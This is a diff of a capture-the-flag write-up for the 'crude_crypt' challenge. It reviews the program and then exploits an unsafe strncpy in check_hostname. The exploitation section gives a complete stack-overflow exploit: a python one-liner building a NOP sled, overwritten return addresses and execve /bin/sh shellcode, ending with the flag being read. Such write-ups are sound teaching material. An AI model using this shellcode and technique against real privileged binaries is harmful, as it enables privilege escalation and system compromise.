@@ -8,55 +8,91 @@ You can never trust user input!
 **Files**: crude_crypt.c
 
 *****
+# Code review
 
-Looking at main, we can see the programs expects 3 arguments: 
-```C
-void help() {
-    printf("You have supplied invalid arguments.\n");
-    printf("./crude_crypt (encrypt|decrypt) (input path) (output path)\n");
-}
+What main does:
+- check if there are 3 arguments
+- check if 1st argument is "encrypt" or "decrypt", and assign action function pointer
+- if encrypt, setegid()
+- open 2nd and 3rd argument as files
+- read out file_password from stdin (max 128 bytes; possibly not null terminated)
+- digest = MD5(password)
+- call action(infile, outfile, digest)
+- cleanup + exit
 
-int main(int argc, char **argv) {
-    if(argc < 4) {
-        help();
-        return -1;
-    }
+What decrypt_file does:
+- get file size of infile (using fstats)
+- calloc buffer of that size
+- copy contents of infile to buffer
+- try decrypt_buffer
+    if fail, return
+- create file_header based on decrypted data; we can put whatever we want in the header!
+- check if magic number is correct
+    if not, return
+- (print error message if hostname doesn't match)
+- write_size = MIN(header->file_size, infile size - header size); possible signed/unsigned bug!
+- write decrypted data to outfile
+
+What check_hostname does:
+- unsafe strncpy from header->host to buffer of size 32
+- call safe_gethostname
+- return after calling strcmp
+
+What encrypt_buffer/decrypt_buffer does:
+- define cypher as AES (rijndael-128 with CBC)
+- check if buffer is a multiple of blocksize
+    if not, fail
+- execute encryption decryption (with "AAAAAAAAAAAAAAAA" as initialisation vector); see reference.
+
+*****
+ # Exploitation
+
+The bug we are going to exploit is in the function check_hostname. The strncpy is used unsafely, because it is being told to copy the contents of src to dest (for the length of **src**). A safe usage would copy the contents of src to dest (for the length of **dest**)! Using strncpy in this way is the same as using strcpy. By copying a src string that is larger than dest, we can cause a stack overflow which we will overwrite eip.
+
+We can exploit this, because after the decryption of the infile, the header is created based on the decrypted data without any checks. This means we control whatever is in the header struct. This includes host, which is usally a 32-byte, null-terminated string. By removing the null byte at the end, we can drastically increase the length of the host string to cause the stack overflow.
+
+In order to verify if this bug works, we will try to encrypt a file full of "a"s, but right before the call to encrypt the data, we will tamper with the header. This will result in an encrypted file that will result in a SEGFAULT when decrypted. We'll use password "a", but it doesn't really matter.
+
+Let's try it:
+```bash
+$ cp -r /home/crudecrypt/ /tmp/delilled
+$ cd /tmp/delilled/crudecrypt
+$ python -c 'print "a"*100' > a_file
+$ <use gdb to read a_file, overwrite any null characters in host, and store the result in enc_file>
+$ ulimit -c unlimited
+$ ./crude_crypt decrypt enc_file dec_file
+-> File password: a
+Segmentation fault (core dumped)
+$ gdb -q crude_crypt core 
+Program terminated with signal SIGSEGV, Segmentation fault.
+#0  0x61616161 in ?? ()
 ```
 
-The first argument can't be messed with; it has to be either "encrypt" or "decrypt":
-```C
-void (*action)(FILE*, FILE*, unsigned char*);
+Ok, so we know we have control of eip and the stack. After checking that the stack is executable ($ readelf crude_crypt -a | grep GNU_STACK), which it is, we will place nop slide + shellcode in our input and overwrite eip with the address of the middle of the nop slide.
 
-if(strcmp(argv[1], "encrypt") == 0) {
-    action = &encrypt_file;
-    // You shouldn't be able to encrypt files you don't have permission to.
-    setegid(getgid());
-} else if(strcmp(argv[1], "decrypt") == 0) {
-    action = &decrypt_file;
-} else {
-    printf("%s is not a valid action.\n", argv[1]);
-    help();
-    return -2;
-}
+Using gdb, we can determine that the hots variable is located at 0xffffd5c0 and the return address is located at 0xffffd60c. If we provide a reasonable nop sled (32 bytes), this should bring the address of the middle of the nop sled to 0xFFFFD64C. It doesn't really matter what we use to fill the host variable before encryption, as long as there are no string terminators (I will be using "a"s).
+
+The structure of the exploit data will be:
+(sled address)*8 + (\x90)*128 + shellcode
+
+SHELLCODE:
+\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+
+```bash
+$ python -c 'print "\x4c\xd6\xff\xff"*8 + "\x90"*128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"' > exploit_data
+$ <use gdb to read exploit_data, overwrite any null characters in host, and store the result in exp_file>
+$ cd /home/crude_crypt
+$ ./crude_crypt decrypt /tmp/delilled/crudecrypt/exp_file /tmp/delilled/crudecrypt/dec_file
+-> File password: a
+$ cat flag.txt
+writing_software_is_hard
 ```
 
-The other 2 arguments have to be filenames:
-```C
-    char* src_file_path = argv[2];
-    char* out_file_path = argv[3];
-    
-    ...
+Note: If you're having trouble with landing on the nop sled, you can push it around using the arguments. Since the 3rd argument (outfile) doesn't matter, as long as it can be opened, you could try playing with this. Alternatively, you could create a bigger nop sled.
 
-    FILE *src_file, *out_file;
+*****
 
-    if((src_file = fopen(src_file_path, "rb")) == NULL) {
-        printf("Could not open input file: %s\n", src_file_path);
-        return -3;
-    }
-
-    if((out_file = fopen(out_file_path, "wb")) == NULL) {
-        printf("Could not open output file: %s\n", out_file_path);
-        fclose(src_file); // Make sure to close the input file
-        return -3;
-    }
-```
+REFERENCES:
+http://codewiki.wikidot.com/c:struct-stat
+http://linux.die.net/man/2/fstat
+http://mcrypt.hellug.gr/lib/mcrypt.3.html
